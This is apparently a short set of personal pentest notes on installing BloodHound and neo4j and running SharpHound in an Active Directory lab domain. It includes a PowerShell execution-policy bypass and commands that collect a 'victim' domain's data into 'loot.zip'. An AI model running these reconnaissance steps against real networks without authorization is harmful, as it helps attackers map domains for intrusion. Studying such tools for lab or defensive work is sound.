# Bloodhound

### Install Bloodhound and neo4j
```
apt install bloodhound neo4j
```

### Start Neo4j database
```
sudo neo4j console
```

### Launch Bloodhound
```
bloodhound
```

### Bypass PowerShell
```
powershell -ep bypass
```

### Run SharpHound on victim.
```
. .\Downloads\SharpHound.ps1
```

### Collect all of the info into a .json file.
```
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

### Forgot your Neo4j password?
* If already running, terminate Neo4j.
* Delete the auth file. ```sudo rm -rf  ./data/dbms/auth```.
* Launch the neo4j service. ```neo4j console```.
* Connect to ```http://localhost:7474/browser/```.
* In the username/password field enter ```neo4j``` / ```neo4j```.
* You should be prompted to change the password.


